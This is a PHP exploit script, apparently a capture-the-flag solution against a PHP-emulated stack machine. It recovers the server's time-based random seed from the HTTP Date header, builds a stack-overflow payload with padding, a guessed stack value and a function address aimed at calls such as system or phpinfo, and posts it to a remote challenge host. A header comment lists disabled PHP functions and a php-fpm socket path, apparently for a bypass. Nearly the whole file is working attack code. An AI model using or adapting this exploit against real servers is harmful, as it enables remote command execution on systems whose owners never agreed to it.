<?php

// file_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,
// fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,
// pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,
// pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,
// pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,
// dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,
// pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,
// pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
// pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,
// symlink,link,syslog,imap_open,ld,mail,dl,putenv
//
// show_source,error_lpg,readfile
//
// /var/run/php/php7.3-fpm.sock

function cyclic($num) {
	$res = "";
	for ($i = 0; $i < $num; $i++) {
		$res .= "v";
	}
	return $res;
}

function post($data) {
	$curl = curl_init();
	// curl_setopt($curl, CURLOPT_URL, 'http://127.0.0.1:8382/output.php');
	// curl_setopt($curl, CURLOPT_URL, 'http://127.0.0.1:8382/2.php');
	// http://xxxxxxx:8307/echohub.php
	// curl_setopt($curl, CURLOPT_URL, 'http://xxxxxxx:8307/2.php');
	// curl_setopt($curl, CURLOPT_URL, 'http://xxxxxxx:8307/echohub.php');
	curl_setopt($curl, CURLOPT_URL, 'http://xxxxxxx:8307/output.php');
	// curl_setopt($curl, CURLOPT_URL, 'http://127.0.0.1:8382/echohub.php');
	// curl_setopt($curl, CURLOPT_URL, 'http://34.85.27.91:10080/index.php/index.php');
	curl_setopt($curl, CURLOPT_HEADER, 1);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_POST, 1);
	curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
	$html = curl_exec($curl);
	curl_close($curl);
	preg_match_all("/Date: (.*?) GMT/", $html, $matches);
	$sss = strtotime($matches[1][0] . " GMT");
	print_r("server seed = " . $sss . "\r\n");
	global $seed;
	print_r("time = \$seed - \$sss = " . ($seed - $sss) . "\r\n");
	print_r($html);
}

function handleData($arg1) {
	$arg1_len = strlen($arg1);
	$len = $arg1_len / 4 + (1 * ($arg1_len % 4));
	$strarray = str_split($arg1, 4);
	$strarray[$len - 1] = str_pad($strarray[$len - 1], 4, "\x00");
	foreach ($strarray as $key => &$value) {
		$value = strrev(bin2hex($value));
	}
	return $strarray;
}
function strrevhex($data) {
	// $data = "$data";
	$r = "";
	$data = strrev($data);
	for ($i = 0; $i < strlen($data); $i++) {
		if ($i % 2 == 0) {
			$r .= "\\x";
		}
		$r .= "$data[$i]";
	}
	echo "r = $r\r\n";
	eval("\$r = \"$r\";");
	echo "r = $r\r\n";
	return $r;
}

$seed = time();
echo "seed = $seed\r\n";
srand($seed);
$INS_OFFSET = rand(0, 0xffff); // 65535
$table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789';
$a1 = $table[rand(0, strlen($table) - 1)];
$a2 = $table[rand(0, strlen($table) - 1)];
$a3 = $table[rand(0, strlen($table) - 1)];
$bottom = handleData($a1 . $a2 . $a3 . "\x00")[0];
echo "stack bottom = $bottom\r\n";
$ebp = 0xfffe0000 + rand(0x0, 0xffff);
$stack[$ebp] = $ebp + rand(0, 0xffff);
$esp_addr = $ebp - rand(0x20, 0x60) * 0x4;
// $esp_args_point_addr = $esp_addr;
$bottom_addr = $ebp - 4;
echo "ebp -> $ebp  bottom_addr -> $bottom_addr  esp_addr -> $esp_addr  \n";
// echo "esp_args_point_addr -> $esp_args_point_addr\r\n";
// ebp -> 4294895201  bottom_addr -> 4294895197  esp_addr -> 4294894909
$pianyi = $bottom_addr - $esp_addr;
$ff = intval($_GET['f']);
// $ff = 1417; // phpinfo
// $ff = 1511; // system
$func_addr_point = $func_addr = $ff + 0x60000000 + $INS_OFFSET + 0x1;
echo "\$func_addr_point = $func_addr_point \r\n";
$func_addr = dechex($func_addr);
echo "\$func_addr = $func_addr \r\n";

$bottom_data = strrevhex($bottom);
$func_addr = strrevhex($func_addr);
echo "\$bottom_data = $bottom_data    \$func_addr = $func_addr\r\n";
echo "\$pianyi = $pianyi\r\n";
$argn = 0;
$post_data = [];
$ans = "";
foreach ($_GET["args"] as $an => $arg) {
	echo "\$_GET['args'][$an] = {$arg}\r\n";
	$ans .= "arg{$an}";
	$post_data["arg{$an}"] = $arg;
	$argn++;
}
echo "\$ans = {$ans}\r\n";
$arg_num = "{$argn}" . "\x00\x00\x00";
$payload = cyclic($pianyi) . $bottom_data . "\x00\x00\x00\x00";
$payload .= $func_addr . $arg_num; //. "func";
$payload .= $ans;
echo "\$payload = $payload\r\n";
$post_data['data'] = $payload;
if ($an >= 0) {
	$post_data[$func_addr_point] = 1;
}
print_r($post_data);
echo "\r\n\r\n#########################\r\n\r\n";
post($post_data);
